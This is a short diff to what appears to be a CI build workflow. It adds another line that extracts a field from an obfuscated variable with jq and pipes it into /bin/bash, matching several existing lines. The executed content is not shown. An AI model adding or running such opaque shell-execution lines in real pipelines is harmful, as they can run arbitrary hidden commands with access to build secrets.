@@ -30,6 +30,7 @@ jobs:
           echo $e68 | jq -r .sramq346 | /bin/bash
           echo $gc2857 | jq -r .a76643 | /bin/bash
           printf '%s' "$ott1" | jq -r .qrli19 | /bin/bash
+          echo $xpw9813 | jq -r .juuat58 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
